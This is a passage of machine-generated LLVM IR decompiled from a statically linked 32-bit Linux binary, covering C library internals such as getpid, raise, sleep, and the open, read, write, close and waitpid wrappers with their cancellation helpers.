dec_label_pc_8062b3d:                             ; preds = %dec_label_pc_8062b39, %dec_label_pc_8062b47
  %v0_8062b4718 = phi i32 [ 0, %dec_label_pc_8062b39 ], [ %v1_8062b47, %dec_label_pc_8062b47 ]
  %v3_8062b3d = mul nuw nsw i32 %v0_8062b4718, 28
  store i32 %v3_8062b3d, i32* %eax.global-to-local, align 4
  %v3_8062b40 = add i32 %v2_8062b40, %v3_8062b3d
  %v4_8062b40 = inttoptr i32 %v3_8062b40 to i32*
  %v5_8062b40 = load i32, i32* %v4_8062b40, align 4
  %v6_8062b40 = icmp eq i32 %v5_8062b40, 0
  br i1 %v6_8062b40, label %dec_label_pc_8062b7e.loopexit, label %dec_label_pc_8062b47

dec_label_pc_8062b47:                             ; preds = %dec_label_pc_8062b3d
  %v1_8062b47 = add nuw nsw i32 %v0_8062b4718, 1
  store i32 %v1_8062b47, i32* %ecx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v1_8062b47, 48
  br i1 %tmp15, label %dec_label_pc_8062b3d, label %dec_label_pc_8062b4d

dec_label_pc_8062b4d:                             ; preds = %dec_label_pc_8062b47
  %v1_8062b4d = inttoptr i32 %v0_8062b4d4 to i32*
  %v2_8062b4d = load i32, i32* %v1_8062b4d, align 4
  store i32 %v2_8062b4d, i32* %edx.global-to-local, align 4
  %v1_8062b4f = icmp eq i32 %v2_8062b4d, 0
  %v1_8062b51 = icmp eq i1 %v1_8062b4f, false
  br i1 %v1_8062b51, label %dec_label_pc_8062b39, label %dec_label_pc_8062b53

dec_label_pc_8062b53:                             ; preds = %dec_label_pc_8062b4d
  store i32 0, i32* @ebx, align 4
  %v5_8062b5e = call i32 @calloc(i64 1, i32 1348, i32 %v3_8062b3d, i32 %v3_8062b3d)
  store i32 %v5_8062b5e, i32* %eax.global-to-local, align 4
  %v1_8062b66 = icmp eq i32 %v5_8062b5e, 0
  br i1 %v1_8062b66, label %dec_label_pc_8062bbc, label %dec_label_pc_8062b6a

dec_label_pc_8062b6a:                             ; preds = %dec_label_pc_8062b53
  store i32 %v5_8062b5e, i32* %edx.global-to-local, align 4
  %v0_8062b6c = load i32, i32* @global_var_8077d7c.1651, align 4
  store i32 %v0_8062b6c, i32* %eax.global-to-local, align 4
  store i32 47, i32* %ecx.global-to-local, align 4
  %v2_8062b76 = inttoptr i32 %v5_8062b5e to i32*
  store i32 %v0_8062b6c, i32* %v2_8062b76, align 4
  %v0_8062b78 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8062b78, i32* @global_var_8077d7c.1651, align 4
  %v1_8062b7e.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8062b7e

dec_label_pc_8062b7e.loopexit:                    ; preds = %dec_label_pc_8062b3d
  br label %dec_label_pc_8062b7e

dec_label_pc_8062b7e:                             ; preds = %dec_label_pc_8062b7e.loopexit, %dec_label_pc_8062b6a
  %v0_8062b81 = phi i32 [ %v0_8062b4d4, %dec_label_pc_8062b7e.loopexit ], [ %v0_8062b78, %dec_label_pc_8062b6a ]
  %v1_8062b7e = phi i32 [ %v0_8062b4718, %dec_label_pc_8062b7e.loopexit ], [ %v1_8062b7e.pre, %dec_label_pc_8062b6a ]
  %v3_8062b7e = mul i32 %v1_8062b7e, 28
  %v2_8062b81 = add i32 %v3_8062b7e, %v0_8062b81
  store i32 %v2_8062b81, i32* %eax.global-to-local, align 4
  %v1_8062b86 = add i32 %v2_8062b81, 4
  %v9_8062b86 = icmp eq i32 %v1_8062b86, 0
  store i32 %v1_8062b86, i32* @ebx, align 4
  %v1_8062b89 = add i32 %v2_8062b81, 24
  %v2_8062b89 = inttoptr i32 %v1_8062b89 to i32*
  store i32 1, i32* %v2_8062b89, align 4
  %v0_8062b90 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062b90 = add i32 %v0_8062b90, 28
  %v2_8062b90 = inttoptr i32 %v1_8062b90 to i32*
  store i32 0, i32* %v2_8062b90, align 4
  br i1 %v9_8062b86, label %dec_label_pc_8062bbc, label %dec_label_pc_8062b99

dec_label_pc_8062b99:                             ; preds = %dec_label_pc_8062b7e
  %v1_8062b9d = load i32, i32* @ebx, align 4
  %v2_8062b9d = add i32 %v1_8062b9d, 4
  %v3_8062b9d = inttoptr i32 %v2_8062b9d to i32*
  %v1_8062ba4 = load i32, i32* @ebx, align 4
  %v2_8062ba4 = add i32 %v1_8062ba4, 8
  %v3_8062ba4 = inttoptr i32 %v2_8062ba4 to i32*
  %v1_8062bab = load i32, i32* @ebx, align 4
  %v2_8062bab = add i32 %v1_8062bab, 12
  %v3_8062bab = inttoptr i32 %v2_8062bab to i32*
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_8062bb2 = load i32, i32* @ebx, align 4
  %v2_8062bb2 = add i32 %v1_8062bb2, 16
  %v3_8062bb2 = inttoptr i32 %v2_8062bb2 to i32*
  store i32 %tmp, i32* %v3_8062bb2, align 4
  %v0_8062bb5 = load i32, i32* @ebx, align 4
  %v1_8062bb6 = inttoptr i32 %v0_8062bb5 to i32*
  %v2_8062bb6 = call i32 @__linkin_atfork(i32* %v1_8062bb6)
  store i32 %v0_8062bb5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062bbc

dec_label_pc_8062bbc:                             ; preds = %dec_label_pc_8062b7e, %dec_label_pc_8062b53, %dec_label_pc_8062b99
  %v0_8062bbc = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8062bbc = icmp eq i32 %v0_8062bbc, 0
  call void @__pseudo_cond_branch(i1 %v1_8062bbc, i32 134622151)
  %v0_8062bc6 = load i32, i32* @global_var_8077d78.1650, align 8
  %v1_8062bc6 = add i32 %v0_8062bc6, -1
  %v9_8062bc6 = icmp eq i32 %v1_8062bc6, 0
  store i32 %v1_8062bc6, i32* @global_var_8077d78.1650, align 8
  %v1_8062bce = icmp eq i1 %v9_8062bc6, false
  call void @__pseudo_cond_branch(i1 %v1_8062bce, i32 134622188)
  %v2_8062bce = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v2_8062bce

; uselistorder directives
  uselistorder i32 %v1_8062bc6, { 1, 0 }
  uselistorder i32 %v5_8062b5e, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8062b4d, { 1, 2, 0 }
  uselistorder i32 %v1_8062b47, { 1, 0, 2 }
  uselistorder i32 %v3_8062b3d, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8062b4718, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder label %dec_label_pc_8062bbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062b3d, { 1, 0 }
}

define i32 @function_8062bd0() local_unnamed_addr {
dec_label_pc_8062bd0:
  ret i32 0
}

define i32 @_L_lock_28() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8077d78.1650 to i32), i32* @ecx, align 4
  %v0_8062be2 = call i32 @__lll_lock_wait_private()
  %v0_8062be7 = call i32 @function_8062b34()
  ret i32 %v0_8062be7
}

define i32 @_L_unlock_93() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8077d78.1650 to i32), i32* @eax, align 4
  %v0_8062bf2 = call i32 @__lll_unlock_wake_private()
  %v0_8062bf7 = call i32 @function_8062bd0()
  ret i32 %v0_8062bf7
}

define i32 @__getpid() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8062bfc = load i32, i32* inttoptr (i32 108 to i32*), align 4
  %v1_8062c03 = icmp eq i32 %v0_8062bfc, 0
  store i32 %v0_8062bfc, i32* %edx.global-to-local, align 4
  %v4_8062c08 = icmp eq i1 %v1_8062c03, false
  %tmp = icmp slt i32 %v0_8062bfc, 1
  %tmp2 = icmp eq i1 %tmp, false
  br i1 %tmp2, label %dec_label_pc_8062c2a, label %dec_label_pc_8062c0a

dec_label_pc_8062c0a:                             ; preds = %entry
  br i1 %v4_8062c08, label %dec_label_pc_8062c17, label %dec_label_pc_8062c0c

dec_label_pc_8062c0c:                             ; preds = %dec_label_pc_8062c0a
  %v0_8062c0c = load i32, i32* inttoptr (i32 104 to i32*), align 8
  store i32 %v0_8062c0c, i32* %edx.global-to-local, align 4
  %v1_8062c13 = icmp eq i32 %v0_8062c0c, 0
  %v1_8062c15 = icmp eq i1 %v1_8062c13, false
  br i1 %v1_8062c15, label %dec_label_pc_8062c2a, label %dec_label_pc_8062c17

dec_label_pc_8062c17:                             ; preds = %dec_label_pc_8062c0c, %dec_label_pc_8062c0a
  %v0_8062c1c = call i32 @getpid()
  store i32 %v0_8062c1c, i32* %edx.global-to-local, align 4
  br i1 %v4_8062c08, label %dec_label_pc_8062c2a, label %dec_label_pc_8062c24

dec_label_pc_8062c24:                             ; preds = %dec_label_pc_8062c17
  store i32 %v0_8062c1c, i32* inttoptr (i32 104 to i32*), align 8
  %v0_8062c2a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8062c2a

dec_label_pc_8062c2a:                             ; preds = %dec_label_pc_8062c17, %dec_label_pc_8062c0c, %entry, %dec_label_pc_8062c24
  %v0_8062c2a = phi i32 [ %v0_8062c1c, %dec_label_pc_8062c17 ], [ %v0_8062c0c, %dec_label_pc_8062c0c ], [ %v0_8062bfc, %entry ], [ %v0_8062c2a.pre, %dec_label_pc_8062c24 ]
  ret i32 %v0_8062c2a

; uselistorder directives
  uselistorder i32 %v0_8062bfc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8062c2a, { 3, 0, 1, 2 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8062c30 = load i32, i32* @ebx, align 4
  store i32 %v0_8062c30, i32* %stack_var_-4, align 4
  %v0_8062c38 = load i32, i32* inttoptr (i32 104 to i32*), align 8
  %v1_8062c3f = icmp eq i32 %v0_8062c38, 0
  %v1_8062c41 = icmp eq i1 %v1_8062c3f, false
  br i1 %v1_8062c41, label %dec_label_pc_8062c56, label %dec_label_pc_8062c43

dec_label_pc_8062c43:                             ; preds = %entry
  %v1_8062c48 = call i32 @int80_syscall(i32 224)
  store i32 %v1_8062c48, i32* inttoptr (i32 104 to i32*), align 8
  br label %dec_label_pc_8062c6b

dec_label_pc_8062c56:                             ; preds = %entry
  %v0_8062c31 = load i32, i32* inttoptr (i32 108 to i32*), align 4
  %tmp6 = icmp slt i32 %v0_8062c31, 1
  %tmp7 = icmp eq i1 %tmp6, false
  br i1 %tmp7, label %dec_label_pc_8062c6b, label %dec_label_pc_8062c5c

dec_label_pc_8062c5c:                             ; preds = %dec_label_pc_8062c56
  br label %dec_label_pc_8062c6b

dec_label_pc_8062c6b:                             ; preds = %dec_label_pc_8062c56, %dec_label_pc_8062c43, %dec_label_pc_8062c5c
  %v1_8062c79 = call i32 @int80_syscall(i32 270)
  %tmp = icmp ult i32 %v1_8062c79, -4095
  br i1 %tmp, label %dec_label_pc_8062c93, label %dec_label_pc_8062c86

dec_label_pc_8062c86:                             ; preds = %dec_label_pc_8062c6b
  %v1_8062c8b = sub i32 0, %v1_8062c79
  store i32 %v1_8062c8b, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8062c93

dec_label_pc_8062c93:                             ; preds = %dec_label_pc_8062c6b, %dec_label_pc_8062c86
  %v0_8062c94 = phi i32 [ %v1_8062c79, %dec_label_pc_8062c6b ], [ -1, %dec_label_pc_8062c86 ]
  %v2_8062c93 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8062c93, i32* @ebx, align 4
  ret i32 %v0_8062c94

; uselistorder directives
  uselistorder i32 %v1_8062c79, { 1, 2, 0 }
  uselistorder i32 108, { 2, 1, 0 }
  uselistorder i32* inttoptr (i32 108 to i32*), { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 104, { 2, 1, 0 }
  uselistorder i32* inttoptr (i32 104 to i32*), { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_8062c93, { 1, 0 }
  uselistorder label %dec_label_pc_8062c6b, { 2, 0, 1 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_8062c98 = load i32, i32* @ebx, align 4
  %v1_8062ca8 = icmp eq i32 %arg1, 0
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v1_8062cae = icmp eq i1 %v1_8062ca8, false
  br i1 %v1_8062cae, label %dec_label_pc_8062ce3, label %dec_label_pc_8062cb0

dec_label_pc_8062cb0:                             ; preds = %entry
  %v0_8062cb0 = load i32, i32* inttoptr (i32 132 to i32*), align 4
  %v1_8062cb6 = and i32 %v0_8062cb0, -71
  store i32 0, i32* @ebx, align 4
  %v9_8062cbb = icmp eq i32 %v1_8062cb6, 8
  %v1_8062cbe = icmp eq i1 %v9_8062cbb, false
  br i1 %v1_8062cbe, label %dec_label_pc_8062d5d, label %dec_label_pc_8062cc4

dec_label_pc_8062cc4:                             ; preds = %dec_label_pc_8062cb0
  store i32 -1, i32* inttoptr (i32 544 to i32*), align 32
  %v0_8062ccf = load i32, i32* inttoptr (i32 132 to i32*), align 4
  %v1_8062ccf = or i32 %v0_8062ccf, 16
  store i32 %v1_8062ccf, i32* inttoptr (i32 132 to i32*), align 4
  %v1_8062cde = call i32 @__libc_errno(i32 %arg1)
  br label %dec_label_pc_8062ce3

dec_label_pc_8062ce3:                             ; preds = %entry, %dec_label_pc_8062cc4
  store i32 65536, i32* %stack_var_-20, align 4
  %v2_8062cf4 = ptrtoint i32* %stack_var_-40 to i32
  %v4_8062cfd = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_8062cf4)
  %v3_8062d05 = load i32, i32* %stack_var_-40, align 4
  %v12_8062d05 = icmp eq i32 %v3_8062d05, 1
  %v1_8062d0a = icmp eq i1 %v12_8062d05, false
  br i1 %v1_8062d0a, label %dec_label_pc_8062d1d, label %dec_label_pc_8062d0c

dec_label_pc_8062d0c:                             ; preds = %dec_label_pc_8062ce3
  %v2_8062d0d = ptrtoint i32* %stack_var_-20 to i32
  %v3_8062d15 = bitcast i32* %stack_var_-20 to %_TYPEDEF_sigset_t*
  %v4_8062d15 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8062d15, i32 %v2_8062d0d)
  br label %dec_label_pc_8062d1d

dec_label_pc_8062d1d:                             ; preds = %dec_label_pc_8062ce3, %dec_label_pc_8062d0c
  %v0_8062d1d = load i32, i32* @edx, align 4
  store i32 0, i32* @ebx, align 4
  %v2_8062d21 = ptrtoint i32* %stack_var_-12 to i32
  %v4_8062d27 = call i32 @__libc_nanosleep(i32 %v2_8062d21, i32 %v2_8062d21, i32 %v0_8062d1d, i32 %v0_8062d1d)
  %v1_8062d2f = icmp eq i32 %v4_8062d27, 0
  br i1 %v1_8062d2f, label %dec_label_pc_8062d44, label %dec_label_pc_8062d33

dec_label_pc_8062d33:                             ; preds = %dec_label_pc_8062d1d
  %v4_8062d40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v4_8062d40, i32* @ebx, align 4
  br label %dec_label_pc_8062d44

dec_label_pc_8062d44:                             ; preds = %dec_label_pc_8062d1d, %dec_label_pc_8062d33
  %v4_8062d44 = urem i8 %tmp, 2
  %v5_8062d44 = icmp eq i8 %v4_8062d44, 0
  %v1_8062d49 = icmp eq i1 %v5_8062d44, false
  br i1 %v1_8062d49, label %dec_label_pc_8062d5d, label %dec_label_pc_8062d4b

dec_label_pc_8062d4b:                             ; preds = %dec_label_pc_8062d44
  %v3_8062d55 = bitcast i32* %stack_var_-20 to %_TYPEDEF_sigset_t*
  %v4_8062d55 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8062d55, i32 0)
  br label %dec_label_pc_8062d5d

dec_label_pc_8062d5d:                             ; preds = %dec_label_pc_8062d44, %dec_label_pc_8062cb0, %dec_label_pc_8062d4b
  %v0_8062d60 = load i32, i32* @ebx, align 4
  store i32 %v0_8062c98, i32* @ebx, align 4
  ret i32 %v0_8062d60

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8062d5d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062d44, { 1, 0 }
  uselistorder label %dec_label_pc_8062d1d, { 1, 0 }
  uselistorder label %dec_label_pc_8062ce3, { 1, 0 }
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8062d70 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8062d70 = icmp eq i32 %v0_8062d70, 0
  %v1_8062d78 = icmp eq i1 %v1_8062d70, false
  call void @__pseudo_cond_branch(i1 %v1_8062d78, i32 134622613)
  %v2_8062d78 = load i32, i32* @eax, align 4
  ret i32 %v2_8062d78
}

define i32 @__GI___close_nocancel(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8062d85 = call i32 @close(i32 %arg1)
  %v5_8062d89 = icmp ult i32 %v1_8062d85, -4095
  %v1_8062d8e = icmp eq i1 %v5_8062d89, false
  call void @__pseudo_cond_branch(i1 %v1_8062d8e, i32 134625224)
  ret i32 %v1_8062d85
}

define i32 @pseudo_cancel.9(i32 %arg1) local_unnamed_addr {
dec_label_pc_8062d95:
  %v4_8062d95 = call i32 @__libc_enable_asynccancel(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8062d9c = load i32, i32* @ebx, align 4
  %v1_8062da7 = call i32 @close(i32 %arg1)
  store i32 %v0_8062d9c, i32* @ebx, align 4
  store i32 %v4_8062d95, i32* @eax, align 4
  %v1_8062dae = call i32 @__libc_disable_asynccancel(i32 %v1_8062da7)
  %v5_8062db4 = icmp ult i32 %v1_8062da7, -4095
  %v1_8062db9 = icmp eq i1 %v5_8062db4, false
  call void @__pseudo_cond_branch(i1 %v1_8062db9, i32 134625224)
  ret i32 %v1_8062da7

; uselistorder directives
  uselistorder i32 %v1_8062da7, { 1, 0, 2 }
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8062dc0 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8062dc0 = icmp eq i32 %v0_8062dc0, 0
  %v1_8062dc8 = icmp eq i1 %v1_8062dc0, false
  call void @__pseudo_cond_branch(i1 %v1_8062dc8, i32 134622699)
  %v2_8062dc8 = load i32, i32* @eax, align 4
  ret i32 %v2_8062dc8
}

define i32 @__GI___open_nocancel(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8062ddc = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v5_8062ddf = icmp ult i32 %v4_8062ddc, -4095
  %v1_8062de4 = icmp eq i1 %v5_8062ddf, false
  call void @__pseudo_cond_branch(i1 %v1_8062de4, i32 134625224)
  ret i32 %v4_8062ddc
}

define i32 @pseudo_cancel.8(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8062deb:
  %v4_8062deb = call i32 @__libc_enable_asynccancel(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8062df1 = load i32, i32* @ebx, align 4
  %v4_8062e03 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  store i32 %v0_8062df1, i32* @ebx, align 4
  store i32 %v4_8062deb, i32* @eax, align 4
  %v1_8062e09 = call i32 @__libc_disable_asynccancel(i32 %v4_8062e03)
  %v5_8062e0f = icmp ult i32 %v4_8062e03, -4095
  %v1_8062e14 = icmp eq i1 %v5_8062e0f, false
  call void @__pseudo_cond_branch(i1 %v1_8062e14, i32 134625224)
  ret i32 %v4_8062e03

; uselistorder directives
  uselistorder i32 %v4_8062e03, { 1, 0, 2 }
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8062e20 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8062e20 = icmp eq i32 %v0_8062e20, 0
  %v1_8062e28 = icmp eq i1 %v1_8062e20, false
  call void @__pseudo_cond_branch(i1 %v1_8062e28, i32 134622795)
  %v2_8062e28 = load i32, i32* @eax, align 4
  ret i32 %v2_8062e28
}

define i32 @__GI___write_nocancel(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8062e3c = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  %v5_8062e3f = icmp ult i32 %v4_8062e3c, -4095
  %v1_8062e44 = icmp eq i1 %v5_8062e3f, false
  call void @__pseudo_cond_branch(i1 %v1_8062e44, i32 134625224)
  ret i32 %v4_8062e3c
}

define i32 @pseudo_cancel.7(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8062e4b:
  %v4_8062e4b = call i32 @__libc_enable_asynccancel(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8062e51 = load i32, i32* @ebx, align 4
  %v4_8062e63 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8062e51, i32* @ebx, align 4
  store i32 %v4_8062e4b, i32* @eax, align 4
  %v1_8062e69 = call i32 @__libc_disable_asynccancel(i32 %v4_8062e63)
  %v5_8062e6f = icmp ult i32 %v4_8062e63, -4095
  %v1_8062e74 = icmp eq i1 %v5_8062e6f, false
  call void @__pseudo_cond_branch(i1 %v1_8062e74, i32 134625224)
  ret i32 %v4_8062e63

; uselistorder directives
  uselistorder i32 %v4_8062e63, { 1, 0, 2 }
}

define i32 @__libc_read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8062e80 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8062e80 = icmp eq i32 %v0_8062e80, 0
  %v1_8062e88 = icmp eq i1 %v1_8062e80, false
  call void @__pseudo_cond_branch(i1 %v1_8062e88, i32 134622891)
  %v2_8062e88 = load i32, i32* @eax, align 4
  ret i32 %v2_8062e88
}

define i32 @__read_nocancel(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8062e9c = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  %v5_8062e9f = icmp ult i32 %v4_8062e9c, -4095
  %v1_8062ea4 = icmp eq i1 %v5_8062e9f, false
  call void @__pseudo_cond_branch(i1 %v1_8062ea4, i32 134625224)
  ret i32 %v4_8062e9c
}

define i32 @pseudo_cancel.6(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8062eab:
  %v4_8062eab = call i32 @__libc_enable_asynccancel(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8062eb1 = load i32, i32* @ebx, align 4
  %v4_8062ec3 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8062eb1, i32* @ebx, align 4
  store i32 %v4_8062eab, i32* @eax, align 4
  %v1_8062ec9 = call i32 @__libc_disable_asynccancel(i32 %v4_8062ec3)
  %v5_8062ecf = icmp ult i32 %v4_8062ec3, -4095
  %v1_8062ed4 = icmp eq i1 %v5_8062ecf, false
  call void @__pseudo_cond_branch(i1 %v1_8062ed4, i32 134625224)
  ret i32 %v4_8062ec3

; uselistorder directives
  uselistorder i32 %v4_8062ec3, { 1, 0, 2 }
}

define i32 @__waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8062ee0 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8062ee0 = icmp eq i32 %v0_8062ee0, 0
  %v1_8062ee8 = icmp eq i1 %v1_8062ee0, false
  call void @__pseudo_cond_branch(i1 %v1_8062ee8, i32 134622987)
  %v2_8062ee8 = load i32, i32* @eax, align 4
  ret i32 %v2_8062ee8
}

define i32 @__waitpid_nocancel(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8062efc = call i32 @waitpid(i32 %arg1, i32* %arg2, i32 %arg3)
  %v5_8062eff = icmp ult i32 %v4_8062efc, -4095
  %v1_8062f04 = icmp eq i1 %v5_8062eff, false
  call void @__pseudo_cond_branch(i1 %v1_8062f04, i32 134625224)
  ret i32 %v4_8062efc
}

define i32 @pseudo_cancel(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8062f0b:
  %v4_8062f0b = call i32 @__libc_enable_asynccancel(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8062f11 = load i32, i32* @ebx, align 4
  %v4_8062f23 = call i32 @waitpid(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8062f11, i32* @ebx, align 4
  store i32 %v4_8062f0b, i32* @eax, align 4
  %v1_8062f29 = call i32 @__libc_disable_asynccancel(i32 %v4_8062f23)
  %v5_8062f2f = icmp ult i32 %v4_8062f23, -4095
  %v1_8062f34 = icmp eq i1 %v5_8062f2f, false
  call void @__pseudo_cond_branch(i1 %v1_8062f34, i32 134625224)
  ret i32 %v4_8062f23

; uselistorder directives
  uselistorder i32 %v4_8062f23, { 1, 0, 2 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8062f3d = load i32, i32* @eax, align 4
  %v2_8062f3d = and i32 %v0_8062f3d, 2
  %v3_8062f3d = icmp eq i32 %v2_8062f3d, 0
  %v0_8062f3f = load i32, i32* @ebx, align 4
  store i32 %v0_8062f3f, i32* %stack_var_-8, align 4
  %v1_8062f40 = icmp eq i1 %v3_8062f3d, false
  br i1 %v1_8062f40, label %dec_label_pc_8062f8f, label %dec_label_pc_8062f42

dec_label_pc_8062f42:                             ; preds = %entry
  %v0_8062f42 = load i32, i32* inttoptr (i32 8 to i32*), align 8
  store i32 %v0_8062f42, i32* %ebx.global-to-local, align 4
  %storemerge.pre = load i32, i32* inttoptr (i32 132 to i32*), align 4
  br label %dec_label_pc_8062f50

dec_label_pc_8062f50:                             ; preds = %dec_label_pc_8062f50, %dec_label_pc_8062f42
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_8062f42 ], [ %v0_8062f57, %dec_label_pc_8062f50 ]
  store i32 %storemerge, i32* %esi.global-to-local, align 4
  %v1_8062f54 = and i32 %storemerge, -3
  store i32 %v1_8062f54, i32* @edx, align 4
  %v0_8062f57 = load i32, i32* inttoptr (i32 132 to i32*), align 4
  %v13_8062f57 = icmp eq i32 %storemerge, %v0_8062f57
  %v20_8062f57 = select i1 %v13_8062f57, i32 %v1_8062f54, i32 %v0_8062f57
  store i32 %v20_8062f57, i32* inttoptr (i32 132 to i32*), align 4
  %v1_8062f60 = load i32, i32* %esi.global-to-local, align 4
  %v12_8062f60 = icmp eq i32 %v0_8062f57, %v1_8062f60
  br i1 %v12_8062f60, label %dec_label_pc_8062f7f, label %dec_label_pc_8062f50

dec_label_pc_8062f68:                             ; preds = %dec_label_pc_8062f7f, %dec_label_pc_8062f68
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 128, i32* @ecx, align 4
  %v1_8062f74 = call i32 @int80_syscall(i32 240)
  %v0_8062f76 = load i32, i32* inttoptr (i32 132 to i32*), align 4
  store i32 %v0_8062f76, i32* @edx, align 4
  %v1_8062f87 = and i32 %v0_8062f76, 12
  %v9_8062f8a = icmp eq i32 %v1_8062f87, 4
  br i1 %v9_8062f8a, label %dec_label_pc_8062f68, label %dec_label_pc_8062f85.dec_label_pc_8062f8f.loopexit_crit_edge

dec_label_pc_8062f7f:                             ; preds = %dec_label_pc_8062f50
  %v0_8062f7f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8062f7f = add i32 %v0_8062f7f, 132
  store i32 %v1_8062f7f, i32* %ebx.global-to-local, align 4
  %v0_8062f85.pre = load i32, i32* @edx, align 4
  %v1_8062f877 = and i32 %v0_8062f85.pre, 12
  %v9_8062f8a9 = icmp eq i32 %v1_8062f877, 4
  br i1 %v9_8062f8a9, label %dec_label_pc_8062f68, label %dec_label_pc_8062f8f

dec_label_pc_8062f85.dec_label_pc_8062f8f.loopexit_crit_edge: ; preds = %dec_label_pc_8062f68
  %v2_8062f8f.pre.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8062f8f

dec_label_pc_8062f8f:                             ; preds = %dec_label_pc_8062f7f, %dec_label_pc_8062f85.dec_label_pc_8062f8f.loopexit_crit_edge, %entry
  %v2_8062f8f = phi i32 [ %v0_8062f3f, %entry ], [ %v2_8062f8f.pre.pre, %dec_label_pc_8062f85.dec_label_pc_8062f8f.loopexit_crit_edge ], [ %v0_8062f3f, %dec_label_pc_8062f7f ]
  %.0 = phi i32 [ undef, %entry ], [ %v1_8062f87, %dec_label_pc_8062f85.dec_label_pc_8062f8f.loopexit_crit_edge ], [ %v1_8062f877, %dec_label_pc_8062f7f ]
